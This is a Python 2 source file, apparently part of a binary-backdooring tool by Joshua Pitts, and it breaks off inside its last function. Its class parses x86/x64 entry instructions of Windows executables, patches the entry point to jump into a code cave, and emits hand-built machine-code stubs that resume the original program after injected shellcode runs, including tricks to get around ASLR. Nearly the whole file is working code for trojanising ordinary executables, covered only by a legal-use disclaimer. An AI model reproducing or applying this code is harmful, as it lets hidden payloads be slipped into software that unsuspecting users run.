'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com

    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.


'''


import struct
import random
from binascii import unhexlify


#Might make this a class
class intelCore():

    nops = [0x90, 0x3690, 0x6490, 0x6590, 0x6690, 0x6790]

    jump_codes = [int('0xe9', 16), int('0xeb', 16), int('0xea', 16)]

    opcode32 = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
                '0x0104': 3, '0x0105': 6, '0x0106': 2, '0x0107': 2,
                '0x0108': 2, '0x0109': 2, '0x010a': 2, '0x010b': 2,
                '0x010c': 3, '0x010d': 6, '0x010e': 2, '0x010f': 2,
                '0x0110': 2, '0x0111': 2, '0x0112': 2, '0x0113': 2,
                '0x0114': 3, '0x0115': 6, '0x0116': 2, '0x0117': 2,
                '0x0118': 2, '0x0119': 2, '0x011a': 2, '0x011b': 2,
                '0x011c': 3, '0x011d': 6, '0x011e': 2, '0x011f': 2,
                '0x0120': 2, '0x0121': 2, '0x0122': 2, '0x0123': 2,
                '0x0124': 3, '0x0125': 6, '0x0126': 2, '0x0127': 2,
                '0x0128': 2, '0x0129': 2, '0x012a': 2, '0x012b': 2,
                '0x012c': 3, '0x012d': 6, '0x012e': 2, '0x012f': 2,
                '0x0130': 2, '0x0131': 2, '0x0132': 2, '0x0133': 2,
                '0x0134': 3, '0x0135': 6, '0x0136': 2, '0x0137': 2,
                '0x0138': 2, '0x0139': 2, '0x013A': 2, '0x013b': 2,
                '0x013c': 3, '0x013d': 6, '0x013e': 2, '0x013f': 2,
                '0x0140': 2, '0x0141': 3, '0x0142': 3, '0x0143': 3,
                '0x0144': 4, '0x0145': 3, '0x0146': 3, '0x0147': 3,
                '0x0148': 3, '0x0149': 3, '0x014a': 3, '0x014b': 3,
                '0x014c': 4, '0x014d': 3, '0x014e': 3, '0x014f': 3,
                '0x0150': 3, '0x0151': 3, '0x0152': 3, '0x0153': 3,
                '0x0154': 4, '0x0155': 3, '0x0156': 3, '0x0157': 3,
                '0x0158': 3, '0x0159': 3, '0x015a': 3, '0x015b': 3,
                '0x015c': 4, '0x015d': 3, '0x015e': 3, '0x015f': 3,
                '0x0160': 3, '0x0161': 3, '0x0162': 3, '0x0163': 3,
                '0x0164': 4, '0x0165': 3, '0x0166': 3, '0x0167': 3,
                '0x0168': 3, '0x0169': 3, '0x016a': 3, '0x016b': 3,
                '0x016c': 4, '0x016d': 3, '0x016e': 3, '0x016f': 3,
                '0x0170': 3, '0x0171': 3, '0x0172': 3, '0x0173': 3,
                '0x0174': 4, '0x0175': 3, '0x0176': 3, '0x0177': 3,
                '0x0178': 3, '0x0179': 3, '0x017a': 3, '0x017b': 3,
                '0x017c': 4, '0x017d': 3, '0x017e': 3, '0x017f': 3,
                '0x0180': 6, '0x0181': 6, '0x0182': 6, '0x0183': 6,
                '0x0184': 7, '0x0185': 6, '0x0186': 6, '0x0187': 6,
                '0x0188': 6, '0x0189': 6, '0x018a': 6, '0x0184': 6,
                '0x018c': 7, '0x018d': 6, '0x018e': 6, '0x018f': 6,
                '0x0190': 6, '0x0191': 6, '0x0192': 6, '0x0193': 6,
                '0x0194': 7, '0x0195': 6, '0x0196': 6, '0x0197': 6,
                '0x0198': 6, '0x0199': 6, '0x019a': 6, '0x019b': 6,
                '0x019c': 7, '0x019d': 6, '0x019e': 6, '0x019f': 6,
                '0x01a0': 6, '0x01a1': 6, '0x01a2': 6, '0x01a3': 6,
                '0x01a4': 7, '0x01a5': 6, '0x01a6': 6, '0x01a7': 6,
                '0x01a8': 6, '0x01a9': 6, '0x01aa': 6, '0x01ab': 6,
                '0x01ac': 7, '0x01ad': 6, '0x01ae': 6, '0x01af': 6,
                '0x01b0': 6, '0x01b1': 6, '0x01b2': 6, '0x01b3': 6,
                '0x01b4': 7, '0x01b5': 6, '0x01b6': 6, '0x01b7': 6,
                '0x01b8': 6, '0x01b9': 6, '0x01ba': 6, '0x01bb': 6,
                '0x01bc': 7, '0x01bd': 6, '0x01be': 6, '0x01bf': 6,
                '0x01c0': 2, '0x01c1': 2, '0x01c2': 2, '0x01c3': 2,
                '0x01c4': 2, '0x01c5': 2, '0x01c6': 2, '0x01c7': 2,
                '0x01c8': 2, '0x01c9': 2, '0x01ca': 2, '0x01cb': 2,
                '0x01cc': 2, '0x01cd': 2, '0x01ce': 2, '0x01cf': 2,
                '0x0f34': 2, '0x31ed': 2, '0x89e1': 2, '0x83e4': 3,
                '0x2b': 2,
                '40': 1, '0x41': 1, '0x42': 1, '0x43': 1,
                '0x44': 1, '0x45': 1, '0x46': 1, '0x47': 1,
                '0x48': 1, '0x49': 1, '0x4a': 1, '0x4b': 1,
                '0x4c': 1, '0x4d': 1, '0x4e': 1, '0x4f': 1,
                '0x50': 1, '0x51': 1, '0x52': 1, '0x53': 1,
                '0x54': 1, '0x55': 1, '0x56': 1, '0x57': 1,
                '0x58': 1, '0x59': 1, '0x5a': 1, '0x5b': 1,
                '0x5c': 1, '0x5d': 1, '0x5e': 1, '0x5f': 1,
                '0x60': 1, '0x61': 1, '0x6201': 2, '0x6202': 2,
                '0x6203': 2, '0x66': 1, '0x623a': 2,
                '0x6204': 3, '0x6205': 6, '0x6206': 2, '0x6207': 2,
                '0x6208': 2, '0x6209': 2, '0x620a': 2, '0x620b': 2,
                '0x620c': 3, '0x64a0': 6, '0x64a1': 6, '0x64a2': 6,
                '0x64a3': 6, '0x64a4': 2, '0x64a5': 2, '0x64a6': 2,
                '0x64a7': 2, '0x64a8': 3, '0x64a9': 6, '0x64aa': 2,
                '0x64ab': 2, '0x64ac': 2, '0x64ad': 2, '0x64ae': 2,
                '0x64af': 2,
                '0x6a': 2,
                '0x70': 2, '0x71': 2, '0x72': 2, '0x73': 2,
                '0x74': 2, '0x75': 2, '0x76': 2, '0x77': 2,
                '0x78': 2,
                '0x79': 2, '0x8001': 3, '0x8002': 3,
                '0x8b45': 3, '0x8945': 3, '0x837d': 4, '0x8be5': 2,
                '0x880a': 2, '0x8bc7': 2, '0x8bf4': 2, '0x893e': 2,
                '0x8965': 3, '0xff15': 6, '0x8b4e': 3, '0x8b46': 3,
                '0x8b76': 3, '0x8915': 6, '0x8b56': 3, '0x83f9': 3,
                '0x81ec': 6, '0x837d': 4, '0x8b5d': 3, '0x8b75': 3,
                '0x8b7d': 3, '0x83fe': 3, '0x8bff': 2, '0x83c4': 3,
                '0x83ec': 3, '0x8bec': 2, '0x8bf6': 2, '0x85c0': 2,
                '0x33c0': 2, '0x33c9': 2, '0x89e5': 2, '0x89ec': 3,
                '0x9c': 1,
                '0xc70424': 7, '0xc9': 1, '0xff25': 6,
                '0xff1410': 3, '0xff1490': 3, '0xff1450': 3,
                '0xe8': 5, '0x68': 5, '0xe9': 5,
                '0xbf': 5, '0xbe': 5,
                '0xcc': 1, '0xcd': 2,
                '0xffd3': 2,
                '0x33f6': 2,
                '0x895c24': 4, '0x8da424': 7, '0x8d4424': 4,
                '0xa1': 5, '0xa3': 5, '0xc3': 1,
                '0xeb': 2, '0xea': 7,
                '0xb9': 5, '0xba': 5, '0xbb': 5, '0xb8': 5,
                '0x8b4424': 4, '0x8d5c24': 4,
                }

    opcode64 = {'0x4150': 2, '0x4151': 2, '0x4152': 2, '0x4153': 2, '0x4154': 2,
                '0x4155': 2, '0x4156': 2, '0x4157': 2,
                '0x4881ec': 7,
                '0x4883c0': 4, '0x4883c1': 4, '0x4883c2': 4, '0x4883c3': 4,
                '0x4883c4': 4, '0x4883c5': 4, '0x4883c6': 4, '0x4883c7': 4,
                '0x4883c8': 4, '0x4883c9': 4, '0x4883ca': 4, '0x4883cb': 4,
                '0x4883cc': 4, '0x4883cd': 4, '0x4883ce': 4, '0x4883cf': 4,
                '0x4883d0': 4, '0x4883d1': 4, '0x4883d2': 4, '0x4883d3': 4,
                '0x4883d4': 4, '0x4883d5': 4, '0x4883d6': 4, '0x4883d7': 4,
                '0x4883d8': 4, '0x4883d9': 4, '0x4883da': 4, '0x4883db': 4,
                '0x4883dc': 4, '0x4883dd': 4, '0x4883de': 4, '0x4883df': 4,
                '0x4883e0': 4, '0x4883e1': 4, '0x4883e2': 4, '0x4883e3': 4,
                '0x4883e4': 4, '0x4883e5': 4, '0x4883e6': 4, '0x4883e7': 4,
                '0x4883e8': 4, '0x4883e9': 4, '0x4883ea': 4, '0x4883eb': 4,
                '0x4883ec': 4, '0x4883ed': 4, '0x4883ee': 4, '0x4883ef': 4,
                '0x4883f0': 4, '0x4883f1': 4, '0x4883f2': 4, '0x4883f3': 4,
                '0x4883f4': 4, '0x4883f5': 4, '0x4883f6': 4, '0x4883f7': 4,
                '0x4883f8': 4, '0x4883f9': 4, '0x4883fa': 4, '0x4883fb': 4,
                '0x4883fc': 4, '0x4883fd': 4, '0x4883fe': 4, '0x4883ff': 4,
                '0x488bc0': 3, '0x488bc1': 3, '0x488bc2': 3, '0x488bc3': 3,
                '0x488bc4': 3, '0x488bc5': 3, '0x488bc6': 3, '0x488bc7': 3,
                '0x488bc8': 3, '0x488bc9': 3, '0x488bca': 3, '0x488bcb': 3,
                '0x488bcc': 3, '0x488bcd': 3, '0x488bce': 3, '0x488bcf': 3,
                '0x488bd0': 3, '0x488bd1': 3, '0x488bd2': 3, '0x488bd3': 3,
                '0x488bd4': 3, '0x488bd5': 3, '0x488bd6': 3, '0x488bd7': 3,
                '0x488bd8': 3, '0x488bd9': 3, '0x488bda': 3, '0x488bdb': 3,
                '0x488bdc': 3, '0x488bdd': 3, '0x488bde': 3, '0x488bdf': 3,
                '0x488be0': 3, '0x488be1': 3, '0x488be2': 3, '0x488be3': 3,
                '0x488be4': 3, '0x488be5': 3, '0x488be6': 3, '0x488be7': 3,
                '0x488be8': 3, '0x488be9': 3, '0x488bea': 3, '0x488beb': 3,
                '0x488bec': 3, '0x488bed': 3, '0x488bee': 3, '0x488bef': 3,
                '0x488bf0': 3, '0x488bf1': 3, '0x488bf2': 3, '0x488bf3': 3,
                '0x488bf4': 3, '0x488bf5': 3, '0x488bf6': 3, '0x488bf7': 3,
                '0x488bf8': 3, '0x488bf9': 3, '0x488bfa': 3, '0x488bfb': 3,
                '0x488bfc': 3, '0x488bfd': 3, '0x488bfe': 3, '0x488bff': 3,
                '0x48895c': 5, '0x4989d1': 3,
                }

    def __init__(self, flItms, file_handle, VERBOSE):
        self.f = file_handle
        self.flItms = flItms
        self.VERBOSE = VERBOSE

    def opcode_return(self, OpCode, instr_length):
        _, OpCode = hex(OpCode).split('0x')
        OpCode = unhexlify(OpCode)
        return OpCode

    def ones_compliment(self):
        """
        Function for finding two random 4 byte numbers that make
        a 'ones compliment'
        """
        compliment_you = random.randint(1, 4228250625)
        compliment_me = int('0xFFFFFFFF', 16) - compliment_you
        if self.VERBOSE is True:
            print "First ones compliment:", hex(compliment_you)
            print "2nd ones compliment:", hex(compliment_me)
            print "'AND' the compliments (0): ", compliment_you & compliment_me
        self.compliment_you = struct.pack('<I', compliment_you)
        self.compliment_me = struct.pack('<I', compliment_me)

    def assembly_entry(self):
        if hex(self.CurrInstr) in self.opcode64:
            opcode_length = self.opcode64[hex(self.CurrInstr)]
        elif hex(self.CurrInstr) in self.opcode32:
            opcode_length = self.opcode32[hex(self.CurrInstr)]
        if self.instr_length == 7:
            self.InstrSets[self.CurrInstr] = (struct.unpack('<Q', self.f.read(7) + '\x00')[0])
        if self.instr_length == 6:
            self.InstrSets[self.CurrInstr] = (struct.unpack('<Q', self.f.read(6) + '\x00\x00')[0])
        if self.instr_length == 5:
            self.InstrSets[self.CurrInstr] = (struct.unpack('<Q', self.f.read(5) +
                                              '\x00\x00\x00')[0])
        if self.instr_length == 4:
            self.InstrSets[self.CurrInstr] = struct.unpack('<I', self.f.read(4))[0]
        if self.instr_length == 3:
            self.InstrSets[self.CurrInstr] = struct.unpack('<I', self.f.read(3) + '\x00')[0]
        if self.instr_length == 2:
            self.InstrSets[self.CurrInstr] = struct.unpack('<H', self.f.read(2))[0]
        if self.instr_length == 1:
            self.InstrSets[self.CurrInstr] = struct.unpack('<B', self.f.read(1))[0]
        if self.instr_length == 0:
            self.InstrSets[self.CurrInstr] = 0
        self.flItms['VrtStrtngPnt'] = (self.flItms['VrtStrtngPnt'] +
                                       opcode_length)
        CallValue = (self.InstrSets[self.CurrInstr] +
                     self.flItms['VrtStrtngPnt'] +
                     opcode_length)
        self.flItms['ImpList'].append([self.CurrRVA, self.InstrSets, CallValue,
                                       self.flItms['VrtStrtngPnt'],
                                       self.instr_length])
        self.count += opcode_length
        return self.InstrSets, self.flItms, self.count

    def pe32_entry_instr(self):
        """
        This fuction returns a list called self.flItms['ImpList'] that tracks the first
        couple instructions for reassembly after the shellcode executes.
        If there are pe entry instructions that are not mapped here,
        please send me the first 15 bytes (3 to 4 instructions on average)
        for the executable entry point once loaded in memory.  If you are
        familiar with olly/immunity it is the first couple instructions
        when the program is first loaded.
        """
        print "[*] Reading win32 entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        self.count = 0
        loop_count = 0
        self.flItms['ImpList'] = []
        while True:
            self.InstrSets = {}
            for i in range(1, 5):
                self.f.seek(self.flItms['LocOfEntryinCode'] + self.count)
                self.CurrRVA = self.flItms['VrtStrtngPnt'] + self.count
                if i == 1:
                    self.CurrInstr = struct.unpack('!B', self.f.read(i))[0]
                elif i == 2:
                    self.CurrInstr = struct.unpack('!H', self.f.read(i))[0]
                elif i == 3:
                    self.CurrInstr = struct.unpack('!I', '\x00' + self.f.read(3))[0]
                elif i == 4:
                    self.CurrInstr = struct.unpack('!I', self.f.read(i))[0]
                if hex(self.CurrInstr) in self.opcode32:
                    self.instr_length = self.opcode32[hex(self.CurrInstr)] - i
                    self.InstrSets, self.flItms, self.count = self.assembly_entry()
                    break

            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break

            loop_count += 1
            if loop_count >= 10:
                print "This program's initial opCodes are not planned for"
                print "Please contact the developer."
                self.flItms['supported'] = False
                break
        self.flItms['count_bytes'] = self.count
        return self.flItms, self.count

    def pe64_entry_instr(self):
        """
        For x64 files
        """

        print "[*] Reading win64 entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        self.count = 0
        loop_count = 0
        self.flItms['ImpList'] = []
        check64 = 0
        while True:
            #need to self.count offset from vrtstartingpoint
            self.InstrSets = {}
            if check64 >= 4:
                check32 = True
            else:
                check32 = False
            for i in range(1, 5):
                self.f.seek(self.flItms['LocOfEntryinCode'] + self.count)
                self.CurrRVA = self.flItms['VrtStrtngPnt'] + self.count
                if i == 1:
                    self.CurrInstr = struct.unpack('!B', self.f.read(i))[0]
                elif i == 2:
                    self.CurrInstr = struct.unpack('!H', self.f.read(i))[0]
                elif i == 3:
                    self.CurrInstr = struct.unpack('!I', '\x00' + self.f.read(3))[0]
                elif i == 4:
                    self.CurrInstr = struct.unpack('!I', self.f.read(i))[0]
                if check32 is False:
                    if hex(self.CurrInstr) in self.opcode64:
                        self.instr_length = self.opcode64[hex(self.CurrInstr)] - i
                        self.InstrSets, self.flItms, self.count = self.assembly_entry()
                        check64 = 0
                        break
                    else:
                        check64 += 1
                elif check32 is True:
                    if hex(self.CurrInstr) in self.opcode32:
                        self.instr_length = self.opcode32[hex(self.CurrInstr)] - i
                        self.InstrSets, self.flItms, self.count = self.assembly_entry()
                        check64 = 0
                        break

            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break

            loop_count += 1
            if loop_count >= 10:
                print "This program's initial opCodes are not planned for"
                print "Please contact the developer."
                self.flItms['supported'] = False
                break
        self.flItms['count_bytes'] = self.count
        return self.flItms, self.count

    def patch_initial_instructions(self):
        """
        This function takes the flItms dict and patches the
        executable entry point to jump to the first code cave.
        """
        print "[*] Patching initial entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        #This is the JMP command in the beginning of the
        #code entry point that jumps to the codecave
        self.f.write(struct.pack('=B', int('E9', 16)))
        if self.flItms['JMPtoCodeAddress'] < 0:
            self.f.write(struct.pack('<I', 0xffffffff + self.flItms['JMPtoCodeAddress']))
        else:
            self.f.write(struct.pack('<I', self.flItms['JMPtoCodeAddress']))
        #align the stack if the first OpCode+instruction is less
        #than 5 bytes fill with      to align everything. Not a for loop.
        FrstOpCode = self.flItms['ImpList'][0][1].keys()[0]

        if hex(FrstOpCode) in self.opcode64:
            opcode_length = self.opcode64[hex(FrstOpCode)]
        elif hex(FrstOpCode) in self.opcode32:
            opcode_length = self.opcode32[hex(FrstOpCode)]
        if opcode_length == 7:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=B', int('90', 16)))
        if opcode_length == 6:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
        if opcode_length == 5:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                #self.f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
                pass
        if opcode_length == 4:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BB', int('90', 16)))
        if opcode_length == 3:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=B', int('90', 16)))
        if opcode_length == 2:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
        if opcode_length == 1:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BBB', int('90', 16),
                                         int('90', 16),
                                         int('90', 16)))

    def resume_execution_64(self):
        """
        For x64 exes...
        """
        verbose = False
        print "[*] Creating win64 resume execution stub"
        resumeExe = ''
        total_opcode_len = 0
        for item in self.flItms['ImpList']:
            OpCode = item[1].keys()[0]
            instruction = item[1].values()[0]
            ImpValue = item[2]
            instr_length = item[4]
            if hex(OpCode) in self.opcode64:
                total_opcode_len += self.opcode64[hex(OpCode)]
            elif hex(OpCode) in self.opcode32:
                total_opcode_len += self.opcode32[hex(OpCode)]
            else:
                "Warning OpCode not found"
            if verbose is True:
                if instruction:
                    print 'instruction', hex(instruction)
                else:
                    print "single opcode, no instruction"

            self.ones_compliment()

            if OpCode == int('e8', 16):  # Call instruction
                resumeExe += "\x48\x89\xd0"  # mov rad,rdx
                resumeExe += "\x48\x83\xc0"  # add rax,xxx
                resumeExe += struct.pack("<B", total_opcode_len)  # length from vrtstartingpoint after call
                resumeExe += "\x50"  # push rax
                if instruction <= 4294967295:
                    resumeExe += "\x48\xc7\xc1"  # mov rcx, 4 bytes
                    resumeExe += struct.pack("<I", instruction)
                elif instruction > 4294967295:
                    resumeExe += "\x48\xb9"  # mov rcx, 8 bytes
                    resumeExe += struct.pack("<Q", instruction)
                else:
                    print "So close.."
                    print ("Contact the dev with the exe and instruction=",
                           instruction)
                    sys.exit()
                resumeExe += "\x48\x01\xc8"  # add rax,rcx
                #-----
                resumeExe += "\x50"
                resumeExe += "\x48\x31\xc9"  # xor rcx,rcx
                resumeExe += "\x48\x89\xf0"  # mov rax, rsi
                resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.compliment_you
                resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif OpCode in self.jump_codes:
                #Let's beat ASLR
                resumeExe += "\xb8"
                aprox_loc_wo_alsr = (self.flItms['VrtStrtngPnt'] +
                                     self.flItms['JMPtoCodeAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     200 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x0b"  # JA (14)
                resumeExe += "\x83\xC1\x16"
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX, CallValue
                resumeExe += "\x50\xc3"
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                resumeExe += struct.pack('<I', self.flItms['VrtStrtngPnt'])
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue - 5)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif instr_length == 7:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 6:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 5:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 4:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<I", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 3:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 2:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<H", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 1:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<B", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 0:
                resumeExe += self.opcode_return(OpCode, instr_length)
                ReturnTrackingAddress = item[3]

        resumeExe += "\x49\x81\xe7"
        resumeExe += self.compliment_you  # zero out r15
        resumeExe += "\x49\x81\xe7"
        resumeExe += self.compliment_me  # zero out r15
        resumeExe += "\x49\x81\xc7"  # ADD r15 <<-fix it this a 4 or 8 byte add does it matter?
        if ReturnTrackingAddress >= 4294967295:
            resumeExe += struct.pack('<Q', ReturnTrackingAddress)
        else:
            resumeExe += struct.pack('<I', ReturnTrackingAddress)
        resumeExe += "\x41\x57"  # push r15
        resumeExe += "\x49\x81\xe7"  # zero out r15
        resumeExe += self.compliment_you
        resumeExe += "\x49\x81\xe7"  # zero out r15
        resumeExe += self.compliment_me
        resumeExe += "\xC3"
        return ReturnTrackingAddress, resumeExe

    def resume_execution_32(self):
        """
        This section of code imports the self.flItms['ImpList'] from pe32_entry_instr
        to patch the executable after shellcode execution
        """
        verbose = False
        print "[*] Creating win32 resume execution stub"
        resumeExe = ''
        for item in self.flItms['ImpList']:
            OpCode = item[1].keys()[0]
            instruction = item[1].values()[0]
            ImpValue = item[2]
            instr_length = item[4]
            if verbose is True:
                if instruction:
                    print 'instruction', hex(instruction)
                else:
                    print "single opcode, no instruction"

            self.ones_compliment()

            if OpCode == int('e8', 16):  # Call instruction
                # Let's beat ASLR :D
                resumeExe += "\xb8"
                if self.flItms['LastCaveAddress'] == 0:
                    self.flItms['LastCaveAddress'] = self.flItms['JMPtoCodeAddress']
                aprox_loc_wo_alsr = (self.flItms['VrtStrtngPnt'] +
                                     #The last cave starting point
                                     #self.flItms['JMPtoCodeAddress'] +
                                     self.flItms['LastCaveAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     500 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x12"  # JA (14)
                resumeExe += "\x83\xC1\x15"  # ADD ECX, 15
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..
                call_addr = (self.flItms['VrtStrtngPnt'] +
                             instruction)

                if call_addr > 4294967295:
                    resumeExe += struct.pack('<I', call_addr - 0xffffffff - 1)
                else:
                    resumeExe += struct.pack('<I', call_addr)
                resumeExe += "\xff\xe0"  # JMP EAX
                resumeExe += "\xb8"  # ADD
                resumeExe += struct.pack('<I', item[3])
                resumeExe += "\x50\xc3"  # PUSH EAX,RETN
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                #had to add - 5 to this below
                resumeExe += struct.pack("<I", self.flItms['VrtStrtngPnt'] - 5)
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                resumeExe += struct.pack('<I', item[3])
                resumeExe += "\x50"
                resumeExe += "\x05"
                resumeExe += struct.pack('<I', instruction)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif OpCode in self.jump_codes:
                #Let's beat ASLR
                resumeExe += "\xb8"
                aprox_loc_wo_alsr = (self.flItms['VrtStrtngPnt'] +
                                     #self.flItms['JMPtoCodeAddress'] +
                                     self.flItms['LastCaveAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     200 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x0b"  # JA (14)
                resumeExe += "\x83\xC1\x16"
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..

                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX,CallV
                resumeExe += "\x50\xc3"
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                resumeExe += struct.pack('<I', self.flItms['VrtStrtngPnt'] - 5)
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue - 2)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif instr_length == 7:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 6:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 5:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 4:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<I", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 3:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 2:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<H", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 1:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<B", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 0:
                resumeExe += self.opcode_return(OpCode, instr_length)
